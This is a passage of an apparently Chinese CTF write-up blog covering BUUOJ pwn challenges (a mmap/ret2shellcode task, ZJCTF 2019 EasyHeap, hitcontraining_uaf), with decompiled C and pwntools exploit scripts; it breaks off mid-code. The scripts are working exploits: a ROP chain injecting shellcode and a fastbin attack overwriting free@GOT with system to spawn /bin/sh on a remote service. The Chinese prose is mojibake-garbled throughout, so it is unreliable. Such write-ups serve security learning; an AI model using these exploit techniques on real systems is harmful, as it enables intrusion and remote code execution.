<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROT_READ       0x1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROT_WRITE      0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROT_EXEC       0x4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROT_NONE       0x0</span></span><br><span class="line">mmap(shellcode_addr, <span class="number">0x1000</span>uLL, PROT_READ | PROT_WRITE | PROT_EXEC, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>)</span><br><span class="line">mprotect(shellcode_addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC)</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜åªé™åˆ¶äº†<code>system()</code> ç›´æ¥ç»™å‡ºäº†æº¢å‡ºç‚¹ æ²¡æœ‰å…¶ä»–é™åˆ¶:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *<span class="title function_">overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">12</span>]; <span class="comment">// [esp+Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å°±æ˜¯ç”³è¯·ä¸€å—å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ç„¶å<code>read()</code>å†™å…¥shellcodeå†ret2shellcode:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26480</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;127.0.0.1&#x27;, 20000)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">mmap_addr = elf.symbols[<span class="string">&#x27;mmap&#x27;</span>]</span><br><span class="line">overflow = elf.symbols[<span class="string">&#x27;overflow&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sehllcode_addr = p32(<span class="number">0xCCBB000</span>)</span><br><span class="line">lenth = p32(<span class="number">0x1000</span>)</span><br><span class="line">prot = p32(<span class="number">7</span>)</span><br><span class="line">flags = p32(<span class="number">0x22</span>)</span><br><span class="line">fd = p32(<span class="number">0xffffffff</span>)</span><br><span class="line">offset = p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">padding = (<span class="number">0xc</span> + <span class="number">4</span>) * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload1 = padding + p32(mmap_addr) + p32(overflow) + sehllcode_addr + lenth + prot + flags + fd + offset</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload2 = padding + p32(read_addr) + sehllcode_addr + p32(<span class="number">0</span>) + sehllcode_addr + p32(<span class="built_in">len</span>(shellcode))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-ZJCTF-2019-EasyHeap-Fastbin-Attack"><a href="#BUUOJ-ZJCTF-2019-EasyHeap-Fastbin-Attack" class="headerlink" title="BUUOJ-[ZJCTF 2019]EasyHeap | Fastbin Attack"></a>BUUOJ-[ZJCTF 2019]EasyHeap | Fastbin Attack</h2><p>å’Œä¸Šä¸€ä¸ªå †é¢˜çš„çŸ¥è¯†ç‚¹åŸºæœ¬ä¸Šä¸€æ · ç”šè‡³å¯ä»¥è¯´æ›´ç®€å• ä½†æ˜¯è¿˜æ˜¯å­¦åˆ°äº†æ–°ä¸œè¥¿æ‰€ä»¥è®°å½•ä¸€ä¸‹</p>
<p>æŸ¥çœ‹æ®µçš„æƒé™:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F27%2F20241027-223034.png" alt="image-20241027223027361"></p>
<p>å‘ç°gotè¡¨å¯å†™</p>
<p>ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">0x1305</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æœ‰ä¸€ä¸ªåé—¨å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">l33t</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºå’Œåˆ é™¤å †éƒ½æ˜¯æ­£å¸¸çš„ åªæœ‰ç¼–è¾‘å †å’Œä¸Šä¸€ä¸ªå †é¢˜ä¸€æ ·å­˜åœ¨Use after freeçš„å †æº¢å‡º è¿™é‡Œä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯é€‰æ‹©åœ¨å…¨å±€å˜é‡<code>magic</code>å‰é¢æŸå¤„ä¸ºfkfdç„¶åè¦†ç›–æ‰ä¸€ä¸ªunsortedbinä¸­çš„chunkçš„fdè¿™æ ·åœ¨ä¸‹æ¬¡ç”³è¯·ä¸€ä¸ªsize &gt;&#x3D; 0x80çš„chunkæ—¶å°±å¯ä»¥ç¼–è¾‘<code>magic</code> å‘ç°è¿™æ ·åšåªåä¸ç”¨ç¼–è¾‘<code>magic</code>å®ƒä¹Ÿä¼šè¢«ç”³è¯·çš„chunkä¸­çš„fdå’Œbkç»™è¦†ç›–ä»è€Œå¯ä»¥æ‰§è¡Œåé—¨å‡½æ•° ä½†æ˜¯æ‰§è¡Œåä¼šå‘ç°flagä¸åœ¨é‚£ä¸ªç›®å½•ä¸‹</p>
<p>å›æƒ³èµ·gotè¡¨å¯å†™ åˆæœ‰äº†è¿™æ ·çš„æ€è·¯: å°†gotè¡¨é‡Œçš„<code>free</code>è¦†ç›–æˆåé—¨æä¾›çš„<code>system</code>å‡½æ•° æ‰§è¡Œ<code>free</code>æ—¶å°±ä¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ å°†è¦é‡Šæ”¾çš„å †å—å†…å®¹ç¼–è¾‘ä¸º<code>/bin/sh</code>å°±èƒ½get shell è¿™é‡Œä¸ºäº†æ–¹ä¾¿å†™å…¥å¯ä»¥å…ˆåˆ©ç”¨fastbin attackè¿›è¡Œä»»æ„å†…å­˜è¯»å†™è¦†ç›–é¢˜ç›®ä¸­å­˜æ”¾ç”³è¯·åˆ°çš„å †å—çš„<code>heaparray</code>æ•°ç»„ ç„¶åç›´æ¥ç”¨ç¼–è¾‘å‡½æ•°æ¥è¿›è¡Œä»»æ„å†…å­˜è¯»å†™ gdbä¸€ä¸‹å‘ç°<code>heaparray</code>ä¸Šä¸è¿œå¤„å°±æœ‰èƒ½å¤Ÿç”³è¯·fastbinçš„ä½ç½®:<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F28%2F20241028-143737.png" alt="image-20241028143737187"></p>
<p>ç”¨ä¸Šä¸€é¢˜çš„æ€è·¯å°±èƒ½å°†<code>system</code>å†™å…¥gotè¡¨ä¸­çš„<code>free</code>äº† åšè¿™é¢˜å‘ç°äº†fastbinç”³è¯·çš„å¦ä¸€ä¸ªé™åˆ¶ å³è¦ç”³è¯·çš„åœ°å€å¯¹åº”çš„headerä¸­sizeå­—æ®µè¦ç¬¦åˆç”³è¯·çš„å¤§å° è¿™é‡Œ<code>0x7f</code>å°±è¦å¯¹åº”0x60 ä¸ç„¶ä¼šç”³è¯·å¤±è´¥:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">so = ELF(<span class="string">&#x27;/oldlibcs/ubt16/64.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">26230</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;127.0.0.1&#x27;, 20000)</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fkfd = <span class="number">0x6020AD</span></span><br><span class="line">magic = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Heap : &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Heap : &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;heap : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_heap</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    <span class="comment"># print(p.recvuntil(b&#x27;Done !&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">create_heap(<span class="number">0x10</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">delete_heap(<span class="number">1</span>)          <span class="comment"># 1</span></span><br><span class="line">delete_heap(<span class="number">2</span>)          <span class="comment"># 2</span></span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(fkfd))</span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">edit_heap(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(free_got))</span><br><span class="line">edit_heap(<span class="number">0</span>, p64(system_plt))</span><br><span class="line">edit_heap(<span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_heap(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="hitcontraining-uaf-Use-after-free"><a href="#hitcontraining-uaf-Use-after-free" class="headerlink" title="hitcontraining_uaf | Use after free"></a>hitcontraining_uaf | Use after free</h2><p>å’Œä¹‹å‰çš„ä¸¤é“å †é¢˜ä¸€æ ·æ˜¯Use after free ä½†æ˜¯å‰é¢åˆ©ç”¨çš„éƒ½æ˜¯Off-By-Oneæ ˆæº¢å‡º è¿™é¢˜æœ‰ç‚¹ä¸ä¸€æ · æ‰€ä»¥è®°å½•ä¸€ä¸‹</p>
<p>ä¸»è¦å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">_DWORD **<span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = (&amp;notelist)[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (_DWORD **)((<span class="type">int</span> (__cdecl *)(_DWORD **))*(&amp;notelist)[v2])((&amp;notelist)[v2]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_DWORD **<span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = (&amp;notelist)[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;notelist)[v2][<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>((&amp;notelist)[v2]);</span><br><span class="line">    <span class="keyword">return</span> (_DWORD **)<span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_DWORD **<span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD **result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD **v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = (_DWORD **)count;</span><br><span class="line">  <span class="keyword">if</span> ( count &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">return</span> (_DWORD **)<span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (&amp;notelist)[i];</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      (&amp;notelist)[i] = (_DWORD **)<span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;notelist)[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;notelist)[i] = print_note_content;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v1 = (&amp;notelist)[i];</span><br><span class="line">      v1[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;notelist)[i][<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (&amp;notelist)[i][<span class="number">1</span>], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> (_DWORD **)++count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span 